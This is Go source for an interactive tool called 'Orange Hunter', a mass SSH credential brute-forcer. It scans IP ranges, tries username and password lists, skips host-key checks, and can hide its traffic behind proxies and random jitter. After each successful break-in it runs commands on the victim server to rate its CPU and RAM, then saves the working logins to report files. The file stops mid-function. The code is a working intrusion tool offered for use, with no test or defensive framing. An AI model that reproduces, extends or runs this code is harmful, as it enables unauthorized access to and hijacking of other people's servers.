// =====================================================================
//  ORANGE HUNTER - Interactive Terminal Application v2.0
//  Full Menu-Driven Interface | No CLI Flags Required
//  Theme: Orange/Gold Cyberpunk | Author: The Auditor
// =====================================================================

package main

import (
	"bufio"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
)

// ==================== THEME COLORS ====================

const (
	FlameOrange = "\033[38;5;208m"
	DarkOrange  = "\033[38;5;166m"
	DeepOrange  = "\033[38;5;202m"
	Gold        = "\033[38;5;220m"
	BrightGold  = "\033[38;5;226m"
	Amber       = "\033[38;5;214m"
	White       = "\033[38;5;15m"
	Grey        = "\033[38;5;245m"
	DimGrey     = "\033[38;5;240m"
	Red         = "\033[38;5;196m"
	Green       = "\033[38;5;46m"
	Cyan        = "\033[38;5;51m"
	Magenta     = "\033[38;5;201m"
	Yellow      = "\033[38;5;226m"
	Reset       = "\033[0m"
	Bold        = "\033[1m"
	Dim         = "\033[2m"
)

// ==================== DATA STRUCTURES ====================

type Target struct {
	IP   string
	Port int
}

type Credential struct {
	Username string
	Password string
}

type VPSSpecs struct {
	Hostname    string `json:"hostname"`
	OS          string `json:"os"`
	CPUCount    int    `json:"cpu_count"`
	RAM         string `json:"ram"`
	Disk        string `json:"disk"`
	PowerRating string `json:"power_rating"`
}

type HuntedVPS struct {
	IP       string   `json:"ip"`
	Port     int      `json:"port"`
	Username string   `json:"username"`
	Password string   `json:"password"`
	Specs    VPSSpecs `json:"specs"`
	FoundAt  string   `json:"found_at"`
	Rating   string   `json:"rating"`
}

type EngineStats struct {
	TotalIPs    int64
	ScannedIPs  int64
	HuntedVPS   int64
	ErrorsCount int64
	StartTime   time.Time
	Mutex       sync.RWMutex
}

type AppConfig struct {
	TargetType  string   // "cidr", "file", "single"
	CIDR        string
	TargetFile  string
	SingleIP    string
	Port        int
	CredType    string   // "combo", "separate"
	ComboFile   string
	UserFile    string
	PassFile    string
	Timeout     int
	Concurrency int
	UseProxy    bool
	ProxyAddr   string
	ProxyUser   string
	ProxyPass   string
	JitterMin   int
	JitterMax   int
}

// ==================== GLOBAL VARIABLES ====================

var (
	stats        EngineStats
	huntedVPSList []HuntedVPS
	huntedMutex  sync.Mutex
	proxyDialer  proxy.Dialer
	useProxy     bool
	resumeMap    map[string]bool
	resumeMutex  sync.RWMutex
	lastScanned  int64
	lastTime     time.Time
	scanSpeed    float64
	speedMutex   sync.RWMutex
	reader       = bufio.NewReader(os.Stdin)
)

// ==================== UTILITY FUNCTIONS ====================

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

func readInput(prompt string) string {
	fmt.Printf("%s%s%s", DarkOrange, prompt, Reset)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func readInputWithDefault(prompt, defaultVal string) string {
	fmt.Printf("%s%s [%s%s%s]: %s", DarkOrange, prompt, Gold, defaultVal, DarkOrange, Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	if input == "" {
		return defaultVal
	}
	return input
}

func printBoxed(title string, lines []string, color string) {
	width := 60
	for _, line := range lines {
		if len(line)+4 > width {
			width = len(line) + 4
		}
	}

	// Top border
	fmt.Printf("%s╔%s╗%s\n", color, strings.Repeat("═", width-2), Reset)
	// Title
	padding := (width - 2 - len(title)) / 2
	fmt.Printf("%s║%s%s%s%s║%s\n", color, strings.Repeat(" ", padding), Gold, title, strings.Repeat(" ", width-2-padding-len(title)), color, Reset)
	fmt.Printf("%s╠%s╣%s\n", color, strings.Repeat("═", width-2), Reset)
	// Lines
	for _, line := range lines {
		fmt.Printf("%s║ %s%-*s %s║%s\n", color, White, width-4, line, color, Reset)
	}
	// Bottom border
	fmt.Printf("%s╚%s╝%s\n", color, strings.Repeat("═", width-2), Reset)
}

func pressEnterToContinue() {
	fmt.Printf("\n%s  اضغط Enter للمتابعة...%s", DimGrey, Reset)
	reader.ReadString('\n')
}

// ==================== BANNER ====================

func printBanner() {
	clearScreen()
	banner := fmt.Sprintf(`
%s%s%s
                         ███████╗ ██████╗ ██████╗ ██╗      ██████╗ ███████╗
                         ██╔════╝██╔═══██╗██╔══██╗██║     ██╔═══██╗██╔════╝
                         ███████╗██║   ██║██████╔╝██║     ██║   ██║█████╗  
                         ╚════██║██║   ██║██╔══██╗██║     ██║   ██║██╔══╝  
                         ███████║╚██████╔╝██║  ██║███████╗╚██████╔╝███████╗
                         ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
%s%s
              ╔═══════════════════════════════════════════════════╗
              ║     ORANGE HUNTER - Interactive Terminal App      ║
              ║   [ Configure | Hunt | Classify | Dominate ]      ║
              ╚═══════════════════════════════════════════════════╝
%s`, FlameOrange, Bold, Amber, Gold, BrightGold, Reset)

	fmt.Print(banner)
}

// ==================== MENU SCREENS ====================

func mainMenu() int {
	printBanner()
	fmt.Printf("\n\n")
	fmt.Printf("%s  ╔══════════════════════════════════════════════════════╗%s\n", DarkOrange, Reset)
	fmt.Printf("%s  ║  %s🎯 MAIN MENU                                        %s║%s\n", DarkOrange, BrightGold, DarkOrange, Reset)
	fmt.Printf("%s  ╠══════════════════════════════════════════════════════╣%s\n", DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[1] %s⚙️  Configure Scan Settings                    %s║%s\n", DarkOrange, Gold, White, DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[2] %s🎯 Load Targets                               %s║%s\n", DarkOrange, Gold, White, DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[3] %s🔑 Load Credentials                           %s║%s\n", DarkOrange, Gold, White, DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[4] %s🔒 Proxy & Anonymity Settings                 %s║%s\n", DarkOrange, Gold, White, DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[5] %s⚡ Performance & Jitter Settings              %s║%s\n", DarkOrange, Gold, White, DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[6] %s📋 View Current Configuration                %s║%s\n", DarkOrange, Gold, White, DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[7] %s🚀 START THE HUNT                            %s║%s\n", DarkOrange, BrightGold, Bold+White, DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[8] %s🦁 View Hunted VPS                           %s║%s\n", DarkOrange, Gold, White, DarkOrange, Reset)
	fmt.Printf("%s  ║  %s[0] %s🚪 Exit                                       %s║%s\n", DarkOrange, Red, White, DarkOrange, Reset)
	fmt.Printf("%s  ╚══════════════════════════════════════════════════════╝%s\n", DarkOrange, Reset)
	fmt.Printf("\n")

	choice := readInputWithDefault("  📌 اختيارك", "1")
	num, err := strconv.Atoi(choice)
	if err != nil {
		return -1
	}
	return num
}

func configMenu(cfg *AppConfig) {
	for {
		printBanner()
		fmt.Printf("\n\n")
		fmt.Printf("%s  ╔══════════════════════════════════════════════════════╗%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s⚙️  SCAN CONFIGURATION                              %s║%s\n", DarkOrange, BrightGold, DarkOrange, Reset)
		fmt.Printf("%s  ╠══════════════════════════════════════════════════════╣%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[1] Port        : %-5d                              %s║%s\n", DarkOrange, White, cfg.Port, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[2] Timeout     : %-5d sec                          %s║%s\n", DarkOrange, White, cfg.Timeout, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[3] Concurrency : %-5d goroutines                   %s║%s\n", DarkOrange, White, cfg.Concurrency, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[0] ↩️  Back to Main Menu                          %s║%s\n", DarkOrange, Gold, DarkOrange, Reset)
		fmt.Printf("%s  ╚══════════════════════════════════════════════════════╝%s\n", DarkOrange, Reset)

		choice := readInputWithDefault("  📌 اختيارك", "0")
		switch choice {
		case "1":
			portStr := readInputWithDefault("  🔌 Port", fmt.Sprintf("%d", cfg.Port))
			if p, err := strconv.Atoi(portStr); err == nil && p > 0 && p < 65536 {
				cfg.Port = p
			}
		case "2":
			timeoutStr := readInputWithDefault("  ⏱️  Timeout (seconds)", fmt.Sprintf("%d", cfg.Timeout))
			if t, err := strconv.Atoi(timeoutStr); err == nil && t > 0 {
				cfg.Timeout = t
			}
		case "3":
			concStr := readInputWithDefault("  ⚡ Concurrency (goroutines)", fmt.Sprintf("%d", cfg.Concurrency))
			if c, err := strconv.Atoi(concStr); err == nil && c > 0 {
				cfg.Concurrency = c
			}
		case "0":
			return
		}
	}
}

func targetsMenu(cfg *AppConfig) {
	for {
		printBanner()
		fmt.Printf("\n\n")
		fmt.Printf("%s  ╔══════════════════════════════════════════════════════╗%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s🎯 TARGETS CONFIGURATION                            %s║%s\n", DarkOrange, BrightGold, DarkOrange, Reset)
		fmt.Printf("%s  ╠══════════════════════════════════════════════════════╣%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[1] CIDR Range   : %-30s %s║%s\n", DarkOrange, White, cfg.CIDR, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[2] IP List File : %-30s %s║%s\n", DarkOrange, White, cfg.TargetFile, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[3] Single IP    : %-30s %s║%s\n", DarkOrange, White, cfg.SingleIP, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[4] Current Type : %-30s %s║%s\n", DarkOrange, Green, cfg.TargetType, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[0] ↩️  Back to Main Menu                          %s║%s\n", DarkOrange, Gold, DarkOrange, Reset)
		fmt.Printf("%s  ╚══════════════════════════════════════════════════════╝%s\n", DarkOrange, Reset)

		choice := readInputWithDefault("  📌 اختيارك", "0")
		switch choice {
		case "1":
			cidr := readInput("  🌐 CIDR (e.g., 192.168.1.0/24): ")
			if cidr != "" {
				if _, _, err := net.ParseCIDR(cidr); err == nil {
					cfg.CIDR = cidr
					cfg.TargetType = "cidr"
					cfg.SingleIP = ""
					cfg.TargetFile = ""
					fmt.Printf("%s  ✅ CIDR range set successfully!%s\n", Green, Reset)
					time.Sleep(500 * time.Millisecond)
				} else {
					fmt.Printf("%s  ❌ Invalid CIDR format!%s\n", Red, Reset)
					time.Sleep(1 * time.Second)
				}
			}
		case "2":
			file := readInput("  📄 IP List file path: ")
			if file != "" {
				if _, err := os.Stat(file); err == nil {
					cfg.TargetFile = file
					cfg.TargetType = "file"
					cfg.SingleIP = ""
					cfg.CIDR = ""
					fmt.Printf("%s  ✅ File loaded successfully!%s\n", Green, Reset)
					time.Sleep(500 * time.Millisecond)
				} else {
					fmt.Printf("%s  ❌ File not found!%s\n", Red, Reset)
					time.Sleep(1 * time.Second)
				}
			}
		case "3":
			ip := readInput("  📍 Single IP: ")
			if ip != "" {
				if net.ParseIP(ip) != nil {
					cfg.SingleIP = ip
					cfg.TargetType = "single"
					cfg.CIDR = ""
					cfg.TargetFile = ""
					fmt.Printf("%s  ✅ Single IP set!%s\n", Green, Reset)
					time.Sleep(500 * time.Millisecond)
				} else {
					fmt.Printf("%s  ❌ Invalid IP address!%s\n", Red, Reset)
					time.Sleep(1 * time.Second)
				}
			}
		case "0":
			return
		}
	}
}

func credentialsMenu(cfg *AppConfig) {
	for {
		printBanner()
		fmt.Printf("\n\n")
		fmt.Printf("%s  ╔══════════════════════════════════════════════════════╗%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s🔑 CREDENTIALS CONFIGURATION                        %s║%s\n", DarkOrange, BrightGold, DarkOrange, Reset)
		fmt.Printf("%s  ╠══════════════════════════════════════════════════════╣%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[1] Combo File (user:pass) : %-20s %s║%s\n", DarkOrange, White, cfg.ComboFile, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[2] User List File         : %-20s %s║%s\n", DarkOrange, White, cfg.UserFile, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[3] Pass List File         : %-20s %s║%s\n", DarkOrange, White, cfg.PassFile, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[4] Current Type           : %-20s %s║%s\n", DarkOrange, Green, cfg.CredType, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[0] ↩️  Back to Main Menu                          %s║%s\n", DarkOrange, Gold, DarkOrange, Reset)
		fmt.Printf("%s  ╚══════════════════════════════════════════════════════╝%s\n", DarkOrange, Reset)

		choice := readInputWithDefault("  📌 اختيارك", "0")
		switch choice {
		case "1":
			file := readInput("  📄 Combo file (user:pass format): ")
			if file != "" {
				if _, err := os.Stat(file); err == nil {
					cfg.ComboFile = file
					cfg.CredType = "combo"
					cfg.UserFile = ""
					cfg.PassFile = ""
					fmt.Printf("%s  ✅ Combo file loaded!%s\n", Green, Reset)
					time.Sleep(500 * time.Millisecond)
				} else {
					fmt.Printf("%s  ❌ File not found!%s\n", Red, Reset)
					time.Sleep(1 * time.Second)
				}
			}
		case "2":
			file := readInput("  👤 User list file: ")
			if file != "" {
				if _, err := os.Stat(file); err == nil {
					cfg.UserFile = file
					fmt.Printf("%s  ✅ User file loaded!%s\n", Green, Reset)
					time.Sleep(500 * time.Millisecond)
				} else {
					fmt.Printf("%s  ❌ File not found!%s\n", Red, Reset)
					time.Sleep(1 * time.Second)
				}
			}
		case "3":
			file := readInput("  🔐 Password list file: ")
			if file != "" {
				if _, err := os.Stat(file); err == nil {
					cfg.PassFile = file
					cfg.CredType = "separate"
					cfg.ComboFile = ""
					fmt.Printf("%s  ✅ Password file loaded!%s\n", Green, Reset)
					time.Sleep(500 * time.Millisecond)
				} else {
					fmt.Printf("%s  ❌ File not found!%s\n", Red, Reset)
					time.Sleep(1 * time.Second)
				}
			}
		case "0":
			return
		}
	}
}

func proxyMenu(cfg *AppConfig) {
	for {
		printBanner()
		proxyStatus := "DISABLED ❌"
		if cfg.UseProxy {
			proxyStatus = fmt.Sprintf("ENABLED ✅ (%s)", cfg.ProxyAddr)
		}

		fmt.Printf("\n\n")
		fmt.Printf("%s  ╔══════════════════════════════════════════════════════╗%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s🔒 PROXY & ANONYMITY SETTINGS                       %s║%s\n", DarkOrange, BrightGold, DarkOrange, Reset)
		fmt.Printf("%s  ╠══════════════════════════════════════════════════════╣%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %sStatus       : %-35s %s║%s\n", DarkOrange, White, proxyStatus, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[1] Proxy Addr : %-30s %s║%s\n", DarkOrange, White, cfg.ProxyAddr, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[2] Proxy User : %-30s %s║%s\n", DarkOrange, White, cfg.ProxyUser, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[3] Proxy Pass : %-30s %s║%s\n", DarkOrange, White, strings.Repeat("*", len(cfg.ProxyPass)), DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[4] Toggle ON/OFF                                 %s║%s\n", DarkOrange, Green, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[0] ↩️  Back to Main Menu                          %s║%s\n", DarkOrange, Gold, DarkOrange, Reset)
		fmt.Printf("%s  ╚══════════════════════════════════════════════════════╝%s\n", DarkOrange, Reset)

		choice := readInputWithDefault("  📌 اختيارك", "0")
		switch choice {
		case "1":
			addr := readInput("  🔗 Proxy address (host:port): ")
			if addr != "" {
				cfg.ProxyAddr = addr
			}
		case "2":
			cfg.ProxyUser = readInput("  👤 Proxy username: ")
		case "3":
			cfg.ProxyPass = readInput("  🔐 Proxy password: ")
		case "4":
			cfg.UseProxy = !cfg.UseProxy
			if cfg.UseProxy && cfg.ProxyAddr == "" {
				fmt.Printf("%s  ⚠️  Set proxy address first!%s\n", Yellow, Reset)
				time.Sleep(1 * time.Second)
				cfg.UseProxy = false
			}
		case "0":
			return
		}
	}
}

func performanceMenu(cfg *AppConfig) {
	for {
		printBanner()
		fmt.Printf("\n\n")
		fmt.Printf("%s  ╔══════════════════════════════════════════════════════╗%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s⚡ PERFORMANCE & JITTER                              %s║%s\n", DarkOrange, BrightGold, DarkOrange, Reset)
		fmt.Printf("%s  ╠══════════════════════════════════════════════════════╣%s\n", DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[1] Concurrency  : %-5d goroutines                 %s║%s\n", DarkOrange, White, cfg.Concurrency, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[2] Timeout      : %-5d seconds                    %s║%s\n", DarkOrange, White, cfg.Timeout, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[3] Jitter Min   : %-5d ms                         %s║%s\n", DarkOrange, White, cfg.JitterMin, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[4] Jitter Max   : %-5d ms                         %s║%s\n", DarkOrange, White, cfg.JitterMax, DarkOrange, Reset)
		fmt.Printf("%s  ║  %s[0] ↩️  Back to Main Menu                          %s║%s\n", DarkOrange, Gold, DarkOrange, Reset)
		fmt.Printf("%s  ╚══════════════════════════════════════════════════════╝%s\n", DarkOrange, Reset)

		choice := readInputWithDefault("  📌 اختيارك", "0")
		switch choice {
		case "1":
			cStr := readInputWithDefault("  ⚡ Concurrency", fmt.Sprintf("%d", cfg.Concurrency))
			if c, err := strconv.Atoi(cStr); err == nil && c > 0 {
				cfg.Concurrency = c
			}
		case "2":
			tStr := readInputWithDefault("  ⏱️  Timeout (sec)", fmt.Sprintf("%d", cfg.Timeout))
			if t, err := strconv.Atoi(tStr); err == nil && t > 0 {
				cfg.Timeout = t
			}
		case "3":
			jStr := readInputWithDefault("  🎲 Jitter Min (ms)", fmt.Sprintf("%d", cfg.JitterMin))
			if j, err := strconv.Atoi(jStr); err == nil && j >= 0 {
				cfg.JitterMin = j
			}
		case "4":
			jStr := readInputWithDefault("  🎲 Jitter Max (ms)", fmt.Sprintf("%d", cfg.JitterMax))
			if j, err := strconv.Atoi(jStr); err == nil && j >= 0 {
				cfg.JitterMax = j
			}
		case "0":
			return
		}
	}
}

func viewConfig(cfg *AppConfig) {
	printBanner()
	fmt.Printf("\n\n")

	lines := []string{
		fmt.Sprintf("Target Type   : %s", cfg.TargetType),
		fmt.Sprintf("CIDR          : %s", cfg.CIDR),
		fmt.Sprintf("Target File   : %s", cfg.TargetFile),
		fmt.Sprintf("Single IP     : %s", cfg.SingleIP),
		fmt.Sprintf("Port          : %d", cfg.Port),
		fmt.Sprintf("Cred Type     : %s", cfg.CredType),
		fmt.Sprintf("Combo File    : %s", cfg.ComboFile),
		fmt.Sprintf("User File     : %s", cfg.UserFile),
		fmt.Sprintf("Pass File     : %s", cfg.PassFile),
		fmt.Sprintf("Timeout       : %d sec", cfg.Timeout),
		fmt.Sprintf("Concurrency   : %d", cfg.Concurrency),
		fmt.Sprintf("Proxy         : %v (%s)", cfg.UseProxy, cfg.ProxyAddr),
		fmt.Sprintf("Jitter        : %d-%d ms", cfg.JitterMin, cfg.JitterMax),
	}

	printBoxed("📋 CURRENT CONFIGURATION", lines, DarkOrange)
	pressEnterToContinue()
}

// ==================== PARSERS ====================

func parseCIDR(cidr string) ([]string, error) {
	ip, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	var ips []string
	for ip := ip.Mask(ipNet.Mask); ipNet.Contains(ip); incrementIP(ip) {
		ips = append(ips, ip.String())
	}
	if len(ips) > 2 {
		return ips[1 : len(ips)-1], nil
	}
	return ips, nil
}

func incrementIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func parseIPList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var ips []string
	seen := make(map[string]bool)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			line = parts[0]
		}
		if net.ParseIP(line) != nil && !seen[line] {
			ips = append(ips, line)
			seen[line] = true
		}
	}
	return ips, scanner.Err()
}

func parseCredentials(userFile, passFile, comboFile string) ([]Credential, error) {
	var credentials []Credential
	if comboFile != "" {
		file, err := os.Open(comboFile)
		if err != nil {
			return nil, err
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				credentials = append(credentials, Credential{
					Username: strings.TrimSpace(parts[0]),
					Password: strings.TrimSpace(parts[1]),
				})
			}
		}
		return credentials, scanner.Err()
	}
	var users, passwords []string
	if userFile != "" {
		file, _ := os.Open(userFile)
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			u := strings.TrimSpace(scanner.Text())
			if u != "" {
				users = append(users, u)
			}
		}
	}
	if passFile != "" {
		file, _ := os.Open(passFile)
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			p := strings.TrimSpace(scanner.Text())
			if p != "" {
				passwords = append(passwords, p)
			}
		}
	}
	for _, u := range users {
		for _, p := range passwords {
			credentials = append(credentials, Credential{Username: u, Password: p})
		}
	}
	return credentials, nil
}

// ==================== VPS INTELLIGENCE ====================

func extractVPSSpecs(client *ssh.Client) VPSSpecs {
	specs := VPSSpecs{PowerRating: "WEAK"}
	cmd := `{
		hostname 2>/dev/null;
		cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"';
		nproc 2>/dev/null;
		free -h 2>/dev/null | awk '/Mem:/{print $2}';
		df -h / 2>/dev/null | awk 'NR==2{print $2}';
	} 2>/dev/null`

	session, err := client.NewSession()
	if err != nil {
		return specs
	}
	defer session.Close()

	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return specs
	}

	lines := strings.Split(strings.TrimSpace(string(output)), "\n")
	for i, line := range lines {
		line = strings.TrimSpace(line)
		switch i {
		case 0:
			specs.Hostname = line
		case 1:
			specs.OS = line
		case 2:
			if cpu, err := strconv.Atoi(line); err == nil {
				specs.CPUCount = cpu
			}
		case 3:
			specs.RAM = line
		case 4:
			specs.Disk = line
		}
	}

	specs.PowerRating = calculatePowerRating(specs)
	return specs
}

func calculatePowerRating(specs VPSSpecs) string {
	score := 0
	if specs.CPUCount >= 16 {
		score += 4
	} else if specs.CPUCount >= 8 {
		score += 3
	} else if specs.CPUCount >= 4 {
		score += 2
	} else if specs.CPUCount >= 2 {
		score += 1
	}

	ramStr := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(specs.RAM, "gi", ""), "g", ""))
	ramStr = strings.ReplaceAll(ramStr, "mi", "")
	ramStr = strings.TrimSpace(ramStr)
	if ram, err := strconv.ParseFloat(ramStr, 64); err == nil {
		if strings.Contains(strings.ToLower(specs.RAM), "mi") {
			ram /= 1024
		}
		if ram >= 32 {
			score += 4
		} else if ram >= 16 {
			score += 3
		} else if ram >= 8 {
			score += 2
		} else if ram >= 4 {
			score += 1
		}
	}

	switch {
	case score >= 9:
		return "GODLIKE"
	case score >= 6:
		return "HIGH"
	case score >= 3:
		return "MEDIUM"
	default:
		return "WEAK"
	}
}

// ==================== SSH HUNT ====================

func huntVPS(target Target, cred Credential, timeout time.Duration) (*HuntedVPS, error) {
	sshConfig := &ssh.ClientConfig{
		User: cred.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(cred.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}

	addr := fmt.Sprintf("%s:%d", target.IP, target.Port)
	var conn net.Conn
	var err error

	if useProxy {
		conn, err = proxyDialer.Dial("tcp", addr)
	} else {
		conn, err = net.DialTimeout("tcp", addr, timeout)
	}

	if err != nil {
		return nil, err
	}
	defer conn.Close()

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, sshConfig)
	if err != nil {
		return nil, err
	}
	defer sshConn.Close()

	client := ssh.NewClient(sshConn, chans, reqs)
	specs := extractVPSSpecs(client)

	return &HuntedVPS{
		IP:       target.IP,
		Port:     target.Port,
		Username: cred.Username,
		Password: cred.Password,
		Specs:    specs,
		FoundAt:  time.Now().Format("2006-01-02 15:04:05"),
		Rating:   specs.PowerRating,
	}, nil
}

// ==================== JITTER ====================

func randomJitter(minDelay, maxDelay time.Duration) time.Duration {
	if minDelay == 0 && maxDelay == 0 {
		return 0
	}
	delta := maxDelay - minDelay
	if delta <= 0 {
		return minDelay
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(delta)))
	return minDelay + time.Duration(n.Int64())
}

// ==================== RESUME SYSTEM ====================

func loadResumeState() {
	resumeMap = make(map[string]bool)
	file, err := os.Open("hunter.resume")
	if err != nil {
		return
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		key := strings.TrimSpace(scanner.Text())
		if key != "" {
			resumeMap[key] = true
		}
	}
}

func saveResumeKey(key string) {
	resumeMutex.Lock()
	resumeMap[key] = true
	resumeMutex.Unlock()
	if len(resumeMap)%50 == 0 {
		flushResumeFile()
	}
}

func flushResumeFile() {
	resumeMutex.RLock()
	defer resumeMutex.RUnlock()
	file, _ := os.Create("hunter.resume")
	defer file.Close()
	for key := range resumeMap {
		file.WriteString(key + "\n")
	}
}

func isResumed(key string) bool {
	resumeMutex.RLock()
	defer resumeMutex.RUnlock()
	return resumeMap[key]
}

// ==================== AUTO-SAVE ====================

func autoSaveResults() {
	huntedMutex.Lock()
	results := make([]HuntedVPS, len(huntedVPSList))
	copy(results, huntedVPSList)
	huntedMutex.Unlock()

	if len(results) == 0 {
		return
	}

	jsonData, _ := json.MarshalIndent(results, "", "  ")
	os.WriteFile("found_vps.json", jsonData, 0644)

	var txtBuilder strings.Builder
	txtBuilder.WriteString("=== ORANGE HUNTER - VPS DISCOVERY REPORT ===\n")
	txtBuilder.WriteString(fmt.Sprintf("Generated: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
	for _, vps := range results {
		txtBuilder.WriteString(fmt.Sprintf(
			"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
				"🎯 IP: %s:%d\n🔑 Login: %s:%s\n"+
				"🖥️  Host: %s | 💻 OS: %s\n"+
				"⚡ CPU: %d | 🧠 RAM: %s | 💾 Disk: %s\n"+
				"🏆 Rating: %s | 🕐 %s\n\n",
			vps.IP, vps.Port, vps.Username, vps.Password,
			vps.Specs.Hostname, vps.Specs.OS,
			vps.Specs.CPUCount, vps.Specs.RAM, vps.Specs.Disk,
			vps.Rating, vps.FoundAt,
		))
	}
	os.WriteFile("report.txt", []byte(txtBuilder.String()), 0644)
}

// ==================== PROGRESS BAR ====================

func drawProgressBar(scanned, total, hunted int64, speed float64) string {
	if total == 0 {
		return ""
	}
	width := 40
	percentage := float64(scanned) / float64(total) * 100
	filled := int(float64(width) * float64(scanned) / float64(total))

	var bar strings.Builder
	bar.WriteString(fmt.Sprintf("%s║%s", DarkOrange, White))

	for i := 0; i < width; i++ {
		if i < filled {
			switch {
			case i < width/4:
				bar.WriteString(fmt.Sprintf("%s█", DeepOrange))
			case i < width/2:
				bar.WriteString(fmt.Sprintf("%s█", FlameOrange))
			case i < width*3/4:
				bar.WriteString(fmt.Sprintf("%s█", Gold))
			default:
				bar.WriteString(fmt.Sprintf("%s█", BrightGold))
			}
		} else if i == filled {
			bar.WriteString(fmt.Sprintf("%s▓", Amber))
		} else {
			bar.WriteString(fmt.Sprintf("%s░", DimGrey))
		}
	}

	bar.WriteString(fmt.Sprintf("%s║%s", DarkOrange, White))
	bar.WriteString(fmt.Sprintf(" %s%5.1f%%%s", BrightGold, percentage, White))
	bar.WriteString(fmt.Sprintf(" │ 🎯 %d/%d", scanned, total))
	bar.WriteString(fmt.Sprintf(" │ 💀 %d", hunted))
	if speed > 0 {
		bar.WriteString(fmt.Sprintf(" │ ⚡ %.1f/s", speed))
	}

	return bar.String()
}

// ==================== HUNTER WORKER ====================

func hunterWorker(targetChan <-chan Target, cred Credential, timeout time.Duration, wg *sync.WaitGroup, minDelay, maxDelay time.Duration) {
	defer wg.Done()
	for target := range targetChan {
		resumeKey := fmt.Sprintf("%s:%d:%s", target.IP, target.Port, cred.Username)
		if isResumed(resumeKey) {
			atomic.AddInt64(&stats.ScannedIPs, 1)
			continue
		}
		if jitter := randomJitter(minDelay, maxDelay); jitter > 0 {
			time.Sleep(jitter)
		}
		vps, err := huntVPS(target, cred, timeout)
		if err == nil && vps != nil {
			huntedMutex.Lock()
			huntedVPSList = append(huntedVPSList, *vps)
			huntedMutex.Unlock()
			atomic.AddInt64(&stats.HuntedVPS, 1)
			printHuntedVPS(*vps)
			autoSaveResults()
		} else if err != nil {
			atomic.AddInt64(&stats.ErrorsCount, 1)
		}
		saveResumeKey(resumeKey)
		atomic.AddInt64(&stats.ScannedIPs, 1)
	}
}

func printHuntedVPS(vps HuntedVPS) {
	var ratingColor string
	switch vps.Rating {
	case "GODLIKE":
		ratingColor = fmt.Sprintf("%s%s👑 GODLIKE", Magenta, Bold)
	case "HIGH":
		ratingColor = fmt.Sprintf("%s🔥 HIGH", Green)
	case "MEDIUM":
		ratingColor = fmt.Sprintf("%s📦 MEDIUM", Yellow)
	default:
		ratingColor = fmt.Sprintf("%s💤 WEAK", Grey)
	}

